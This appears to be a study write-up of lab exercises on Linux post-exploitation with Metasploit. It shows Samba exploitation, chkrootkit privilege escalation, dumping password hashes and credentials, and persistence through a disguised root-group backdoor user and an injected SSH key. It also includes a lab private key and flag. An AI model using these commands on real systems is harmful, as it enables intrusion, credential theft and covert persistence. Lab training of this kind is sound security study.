# 🔬Linux Post Exploitation - MSF

## Lab 1

> 🔬 [Post Exploitation Lab I](https://www.attackdefense.com/challengedetails?cid=194)
>
> - Target IP: `192.215.55.3`
> - Metasploit **`post/linux/gather/`** modules

```bash
ip -br -c a
	eth1@if165838 UP 192.215.55.2/24 
```

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.215.55.3
setg RHOST 192.215.55.3
workspace -a Linux_PostExp
```

- Perform an `nmap` scan directly into MSF

```bash
db_nmap -sV 192.215.55.3
```

```bash
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

### Exploitation

```bash
search type:exploit name:samba
use exploit/linux/samba/is_known_pipename
options
run
```

```bash
pwd
	/tmp
```

```bash
# CTRL + Z to background the shell
sessions
```

- Upgrade the `shell cmd/unix` sessions to a `Meterpreter` session

```bash
sessions -u 1
sessions 2
```

- Some local enumeration

```bash
sysinfo
    Computer     : 192.215.55.3
    OS           : Debian 8.11 (Linux 5.4.0-131-generic)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux
getuid
	Server username: uid=0, gid=0, euid=0, egid=0
	# "root" user Meterpreter session
```

```bash
shell
```

```bash
/bin/bash -i
whoami

# Enumerate Users
cat /etc/passwd

groups root

cat /etc/*issue

cat /etc/*release

uname -a
```

![](.gitbook/assets/image-20230422123005653.png)

```bash
# Network Enumeration
netstat -antp

# if not working
ss -tnl

 State Recv-Q Send-Q Local Address:Port Peer Address:Port 
 LISTEN 0      50 				 *:445 		*:*     
 LISTEN 0      4096 	127.0.0.11:39389 	*:*     
 LISTEN 0      50 				 *:139 		*:*     
 LISTEN 0      50 				:::445 	   :::*     
 LISTEN 0      50 				:::139 	   :::*     
```

```bash
# List processes
ps aux

# Enumerate environment variables
env
```

![](.gitbook/assets/image-20230422123421018.png)

### Some Post Exploitation

- Enumerate apps and services **configuration files**

```bash
exit
# if the session dies, open a new one
sessions -u 1
```

```bash
search enum_configs
use post/linux/gather/enum_configs
info
# Description:
#   This module collects configuration files found on commonly installed 
#   applications and services, such as Apache, MySQL, Samba, Sendmail, 
#   etc. If a config file is found in its default path, the module will 
#   assume that is the file we want.
sessions
# Set the Meterpreter session
set SESSION 4
run

# It will not migrate if it's already a x64 process  
```

![Metasploit - post/linux/gather/enum_configs](.gitbook/assets/image-20230422123734142.png)

```bash
loot
# Check the enumerated configuration files
```

- Enumerate system **environment variables**

```bash
search env platform:linux
use post/multi/gather/env
info
# Description:
#   This module prints out the operating system environment variables
sessions
set SESSION 3
run
```

![Metasploit - post/multi/gather/env](.gitbook/assets/image-20230422124555124.png)

- Enumerate **network information**

```bash
search enum_network
use post/linux/gather/enum_network
info
# Description:
#   This module gathers network information from the target system 
#   IPTables rules, interfaces, wireless information, open and listening 
#   ports, active network connections, DNS information and SSH 
#   information.
set SESSION 3
run
```

![Metasploit - post/linux/gather/enum_network](.gitbook/assets/image-20230422124816182.png)

```bash
loot
cat /root/.msf4/loot/20230422104739_Linux_PostExp_192.215.55.3_linux.enum.netwo_707609.txt

    search members.linode.com
    nameserver 127.0.0.11
    options edns0 trust-ad ndots:0
```

- Check for **protection/security systems**

```bash
search enum_protections
use post/linux/gather/enum_protections
info
# Description:
#   This module checks whether popular system hardening mechanisms are 
#   in place, such as SMEP, SMAP, SELinux, PaX and grsecurity. It also 
#   tries to find installed applications that can be used to hinder, 
#   prevent, or detect attacks, such as tripwire, snort, and apparmor. 
#   This module is meant to identify Linux Secure Modules (LSM) in 
#   addition to various antivirus, IDS/IPS, firewalls, sandboxes and 
#   other security related software.
set SESSION 3
run
```

![Metasploit - post/linux/gather/enum_protections](.gitbook/assets/image-20230422125210727.png)

```bash
notes
# check above information stored within the MSFdb
```

- Enumerate the **system**

```bash
search enum_system
use post/linux/gather/enum_system
info
# Description:
#   This module gathers system information. We collect installed 
#   packages, installed services, mount information, user list, user 
#   bash history and cron jobs
set SESSION 3
run
```

![Metasploit - post/linux/gather/enum_system](.gitbook/assets/image-20230422125507452.png)

```bash
loot
# Check the installed packages on the O.S.

cat /root/.msf4/loot/20230422105452_Linux_PostExp_192.215.55.3_linux.enum.syste_557868.txt
```

- Check if the target is a VM or a **container**

```bash
search checkcontainer
use post/linux/gather/checkcontainer
# Description:
#   This module attempts to determine whether the system is running 
#   inside of a container and if so, which one. This module supports 
#   detection of Docker, LXC, and systemd nspawn.
set SESSION 3
run
	[+] This appears to be a 'Docker' container
```

![Metasploit - post/linux/gather/checkcontainer](.gitbook/assets/image-20230422125830993.png)

> 📌 *A Docker container can be exploited to break out of it and  gain access to the host system.*

- Enumerate **VM**

```bash
search checkvm
use post/linux/gather/checkvm
set SESSION 3
run
# The target is not a VM
```

![Metasploit - post/linux/gather/checkvm](.gitbook/assets/image-20230422130151548.png)

- Enumerate **users history**

```bash
search enum_users_history
use post/linux/gather/enum_users_history
# Description:
#   This module gathers the following user-specific information: shell 
#   history, MySQL history, PostgreSQL history, MongoDB history, Vim 
#   history, lastlog, and sudoers.
set SESSION 3
run

# If this doesn't work, migrate to a "NT AUTHORITY\SYSTEM" user service
```

![Metasploit - post/linux/gather/enum_users_history](.gitbook/assets/image-20230422130408774.png)

```bash
loot
cat /root/.msf4/loot/20230422110345_Linux_PostExp_192.215.55.3_linux.enum.users_227379.txt

    whoami
    cat /etc/passwd
    cat /etc/*issue
    cat /etc/*release
    uname -a
    ip a s
    netstat -antp
    ss -tnl
    ps aux
    env
```

------

## Lab 2 - Privilege Escalation

> 🔬 [Privilege Escalation - Rootkit Scanner](https://attackdefense.com/challengedetails?cid=1396)
>
> - Target IP: `192.15.244.3`
> - Exploit a vulnerable **Rootkit Scanner** and escalate privileges to root user
> - [Chkrootkit 0.49 - Local Privilege Escalation](https://www.exploit-db.com/exploits/33899)
> - SSH Credentials: `jackie`:`password`

```bash
ip -br -c a
	192.15.244.2/24
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.15.244.3
setg RHOST 192.15.244.3
workspace -a Linux_Privesc
```

- Perform an `nmap` scan directly into MSF

```bash
db_nmap -sV 192.15.244.3
```

```bash
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

### Exploitation - SSH

```bash
search ssh_login
use auxiliary/scanner/ssh/ssh_login
options
set USERNAME jackie
set PASSWORD password
run
```

```bash
sessions
	1 shell unknown  SSH jackie:password (192.15.244.3:22)
sessions 1
/bin/bash -i
pwd
	/home/jackie
whoami
	jackie

cat /etc/*issue
	Ubuntu 18.04.3 LTS \n \l
uname -r

# CTRL+Z
```

```bash
sessions -u 1
sessions
sessions 2

sysinfo
    Computer     : 192.15.244.3
    OS           : Ubuntu 18.04 (Linux 5.4.0-131-generic)
    Architecture : x64
    BuildTuple   : i486-linux-musl
    Meterpreter  : x86/linux
getuid
	Server username: no-user @ victim-1 (uid=1000, gid=1000, euid=1000, egid=1000)
```

```bash
shell
/bin/bash -i
cat /etc/passwd
```

![](.gitbook/assets/image-20230422133205452.png)

```bash
ps aux
```

![ps aux](.gitbook/assets/image-20230422133341465.png)

- Investigate the `/bin/check-down` binary

```bash
cat /bin/check-down

    #!/bin/bash
    while :
    do
            /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
            sleep 60
    done
```

![cat /bin/check-down](.gitbook/assets/image-20230422133438780.png)

> 📌 The `/usr/local/bin/chkrootkit/chkrootkit` binary is executed every 60 seconds.
>
> - [**`chkrootkit`**](https://www.chkrootkit.org/) - locally checks for signs of a rootkit
>
> Chkrootkit < 0.50 is vulnerable to [local privilege escalation vulnerability](https://www.exploit-db.com/exploits/33899)

- Check `chkrootkit` version

```bash
chkrootkit -V
	chkrootkit version 0.49
```

- Background both the shell and the meterpreter session with `CTRL+Z`

### Privilege Escalation

- The technique will depend on the version of the target Linux Kernel and the distribution version.
  - It is necessary to manually enumerate a privesc vulnerable program, `Chkrootkit v.0.49` in this case 

```bash
search chkrootkit
use exploit/unix/local/chkrootkit
info
# Description:
#   Chkrootkit before 0.50 will run any executable file named 
#   /tmp/update as root, allowing a trivial privilege escalation. 
#   WfsDelay is set to 24h, since this is how often a chkrootkit scan is 
#   scheduled by default.
set CHKROOTKIT /bin/chkrootkit
set SESSION 2
set LHOST 192.15.244.2
sessions # check the used ports
run
```

![exploit/unix/local/chkrootkit](.gitbook/assets/image-20230422134736591.png)

```bash
/bin/bash -i
ls
cat flag
```



<details>
<summary>Reveal Flag: 🚩</summary>



`9db8bf8f483ff50857f26f9bd636bed6`

![](.gitbook/assets/image-20230422134925689.png)

</details>



------

## Lab 3 - Dumping Hashes

> 🔬 [Post Exploitation Lab II](https://www.attackdefense.com/challengedetails?cid=195)
>
> - Target IP: `192.252.196.3`
> - Metasploit **`post/linux/gather/`** credentials dumping modules
>

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.252.196.3
setg RHOST 192.252.196.3
workspace -a Linux_PostExp
db_nmap -sV 192.252.196.3
```

```bash
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

### Exploitation

```bash
search type:exploit name:samba
use exploit/linux/samba/is_known_pipename
options
run
```

```bash
pwd
	/tmp
```

```bash
# CTRL + Z to background the shell
sessions
```

- Upgrade the `shell cmd/unix` sessions to a `Meterpreter` session

```bash
sessions -u 1
sessions 2

getuid
	Server username: uid=0, gid=0, euid=0, egid=0
	# "root" user Meterpreter session
```

- Linux user account hashes can be dumped using the privileged `root` user.
- Terminate the shell session and background the meterpreter session.

### Hashdump

> 📌 Linux password hashes are stored in the **`/etc/shadow`** file, accessible **only by a user with root privileges**.
>
> - In newer Linux, the hashed passwords are stored in the `/etc/shadow` file. In turn, the hashed password field in the `/etc/passwd` file is filled with the `x` character. `/etc/passwd` is readable by all the users.
> - Linux users' passphrases are hashed using the [crypt](https://manpages.debian.org/unstable/libcrypt-dev/crypt.5.en.html) function. The hashed passphrase follows a specific format: **`$id$salt$hashedpassword`**
> - [Methods Used by Linux for Hashing Passwords](https://www.baeldung.com/linux/hashing-methods-password)

- `post/linux/gather/hashdump` module need to be run manually to dump the user account hashes and unshadow them
  - A hash can be cracked (with `John the Ripper`) or stored for later use

```bash
search hashdump
use post/linux/gather/hashdump
info
# Description:
#   Post Module to dump the password hashes for all users on a Linux 
#   System
set SESSION 2
run
```

![Metasploit - post/linux/gather/hashdump](.gitbook/assets/image-20230422144950444.png)

![loot](.gitbook/assets/image-20230422145236520.png)

### Some Post Exploitation

- Enumerate **ssh** directories

```bash
search ssh_creds
use post/multi/gather/ssh_creds
info
# Description:
#   This module will collect the contents of all users' .ssh directories 
#   on the targeted machine. Additionally, known_hosts and 
#   authorized_keys and any other files are also downloaded. This module 
#   is largely based on firefox_creds.rb.
sessions
# Set the Meterpreter session
set SESSION 2
run
```

![Metasploit - post/multi/gather/ssh_creds](.gitbook/assets/image-20230422145010635.png)

- Enumerate users' **.ecrypts directories**

```bash
search ecryptfs_creds
use post/linux/gather/ecryptfs_creds
info
# Description:
#   This module will collect the contents of all users' .ecrypts 
#   directories on the targeted machine. Collected "wrapped-passphrase" 
#   files can be cracked with John the Ripper (JtR) to recover "mount 
#   passphrases".
sessions
set SESSION 2
run
```

![Metasploit - post/linux/gather/ecryptfs_creds](.gitbook/assets/image-20230422150125356.png)

- Enumerate **WiFi credentials**

```bash
search enum_psk
use post/linux/gather/enum_psk
info
# Description:
#   This module collects 802-11-Wireless-Security credentials such as 
#   Access-Point name and Pre-Shared-Key from your target CLIENT Linux 
#   machine using /etc/NetworkManager/system-connections/ files. The 
#   module gathers NetworkManager's plaintext "psk" information.
set SESSION 2
run
```

![Metasploit - post/linux/gather/enum_psk](.gitbook/assets/image-20230422152033281.png)

- Check for **PPTP VPN chap-secrets credentials**

```bash
search pptpd_chap_secrets
use post/linux/gather/pptpd_chap_secrets
info
# Description:
#   This module collects PPTP VPN information such as client, server, 
#   password, and IP from your target server's chap-secrets file.
set SESSION 2
run
```

![Metasploit - post/linux/gather/pptpd_chap_secrets](.gitbook/assets/image-20230422152700235.png)

- Perform **SSH Persistence**

```bash
search sshkey
use post/linux/manage/sshkey_persistence
info
# Description:
#   This module will add an SSH key to a specified user (or all), to 
#   allow remote login via SSH at any time.
set SESSION 2
run
```

![Metasploit - post/linux/manage/sshkey_persistence](.gitbook/assets/image-20230422152922123.png)

------

## Lab 3 - Persistence

> 🔬 Same as [Privilege Escalation - Rootkit Scanner](https://attackdefense.com/challengedetails?cid=1396)
>
> - Target IP: `192.101.97.3`
> - Metasploit **`post/linux/gather/`** credentials dumping modules

```bash
ip -br -c a
	192.101.97.2/24
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.101.97.3
setg RHOST 192.101.97.3
workspace -a Linux_Persistence
db_nmap -sV 192.101.97.3
```

```bash
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

### Exploitation

```bash
search ssh_login
use auxiliary/scanner/ssh/ssh_login
options
set USERNAME jackie
set PASSWORD password
run
sessions
```

- Upgrade the `shell cmd/unix` sessions to a `Meterpreter` session

```bash
sessions -u 1
```

### Privilege Escalation

```bash
search chkrootkit
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION 2
set LHOST 192.101.97.2
run

# CTRL+Z to background the shell session
```

- Upgrade the privileged session 3 to a `Meterpreter` session

```bash
sessions -u 3
sessions 4
```

- `SESSION 4` is a Meterpreter privileged session

![](.gitbook/assets/image-20230422164900736.png)

### Persistence

- Create a backdoor user with administrative privileges that can be used to access the target system via SSH

```bash
shell
whoami
	root
cat /etc/passwd
# Create a user that looks like a service account
# and add it to "root group"
useradd -m ftp -s /bin/bash
passwd ftp
	password123
usermod -aG root ftp
usermod -u 15 ftp
groups ftp
	ftp : ftp root
```

❗ Changing user's password is a strong indicator of compromise, it should not be done.

- Perform **SSH Persistence** with a Metasploit persistence modules

```bash
exit # CTRL+C
background
```

```bash
search platform:linux persistence
use post/linux/manage/sshkey_persistence
info
# Description:
#   This module will add an SSH key to a specified user (or all), to 
#   allow remote login via SSH at any time.
set SESSION 4
set CREATESSHFOLDER true
run
```

![Metasploit - post/linux/manage/sshkey_persistence](.gitbook/assets/image-20230422165505058.png)

- Access the private key and copy the content of the `id_rsa` file and save it as a new file. Assign the appropriate permissions to the file

```bash
loot
cat /root/.msf4/loot/20230422145422_Linux_Persistenc_192.101.97.3_id_rsa_460359.txt
```

- Exit the `msfconsole` with command **`exit -y`**. All the sessions will be closed.

```bash
vim ssh_key

# Add the private key, save and exit vim --> :wq
```

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Xp0HZyPC+dUSBRJGhFbqG3pl4+Z1hu3jOfGE6zax4TZUK0x
eZ6gSPhNoVLDT8iaB3Hp5lyXY+Ly/o8Uw/SofZbJin3jpfL96f9YdR4fJ3ECoIwB
EBLDveMNRKFhLU5ZqrdpwyvZi+j4rtuAK3SOdYxHdWZqSAEntFp9PDrcMaAckbNk
48oKpkOyQ57bQf5NZrl+pUp4rkXV3gtm4WUD2R4tnFYsM++3uPO7+VDcW4Rjz2nd
3zz/pKn4EKtP2IcYHGr3nomv7syKFsFiharFOczcDigCw+WPnpUKHIAcfrTv25V+
iZC7VrUFV/r5OBKXl2LhV7efgR0nugYISROiKwIDAQABAoIBAQCOApLnZDSBoGC9
wKrSNkRKCcFbUym6Qe4MYzAgNIXYztI4ZEFvLr+A2HxgSmhIFTl+pJYp6kljmP6c
3kj4k0sKYQfekHudC/9g/A9uzm3WYkGir2clC2ORvnRHO5RSj5QwLMlRW8/OjrDQ
cdQRIaJWRDRJfZW9nLLbDKFsDIcsSCGDjgSPk6LXOmVD0xfGhT++IPFRzeMIQPC4
1DnQ5gPHIeUQ6EDHy+ULdANRONQA/8SiAMFVKL8QlkDsJHXak+ouomwdZk7w/vhj
v7bStU73vzPmCUQUTyfF6qmTqZ7MrgF9qHfWCS7+W6pXIU1SW5S23VbU/3XRWwIQ
WmPi7+d5AoGBAPe64klNRJH1c4jvtG9wckNzThPyKjPv5Qun7qMh/pCEVB0rXD7S
5vGdgC2VbrjsnErX/gYfhP/fXF1V5VFf3fjflH67e3aU+Zt3ueiZLW3pp1+odpwO
6YxIS15/vjFTr/G0JbkLaUgmGx0ytsUrIaMgVwwEbQKEQp1oW1tP0m1/AoGBANh4
qxzJ70DuvGsAd+RkAt91rV8xx4jd9Dpnl0o2/FtMC2ML6K7yjLx0MRBkH+CAt+Ia
HihTQpdcfwoZ3gcBL9VQUkaqleNukVLgOz6beCbAJyukMr73TEb6DwQe3j3xeEFB
JxS5IkOUwKWA4Oju6/hrw4/v+FsfkhwJuD/kLDlVAoGAP9ggHXgWZe92GSJ9xAKc
0BlVU/qjOcNnqjtbWxuVubUA4IueOGquLjLDJ/xNDseb+AX2Z6mT40WzTjKm6PPm
Bw/H+2liBkuakKCofvOLK7p98j8+YjXNpuOy2OXfJGNHAunElw4D0h5P+pRpWiMl
hh79kBFL7swbRunwMXY+6w0CgYBIXcauYB+YsHbSupxaAMkpFPj5ivWunqyn3buo
9srUZo6j9PY7jiBYW+uPFDnH3qAaeSq9xl/LpANgSBd+dfocsLZgo2RqXKs+bnG/
00+OfMxbfY/tYVThoXTlpsAbKx9NiU9cUSvQNelVKsmFdWHzcWs2Mj3vkJVSxDkR
OuFB5QKBgQDwkbPu1MJy7VJVGfky7RZYkuqsDB1sdmS9JL+HwCC4M3Ox3q4zKvCQ
rZ2zCzqdgVAL/OhV7pxBFKPJ1+jEKcp+ItUIPaVFzrg7V29Qco9yePjCHPLepkTe
zpo9B6Oiq0fAKlYI0LJ9Bw+jSQU5Q7BUUxBSm07QbITuxJdgmVoxdw==
-----END RSA PRIVATE KEY-----
```

```bash
chmod 0400 ssh_key
```

- Authenticate to the target with the private key

```bash
ssh -i ssh_key root@192.101.97.3
```

![ssh -i ssh_key root@<TARGET_IP>](.gitbook/assets/image-20230422170517426.png)

------

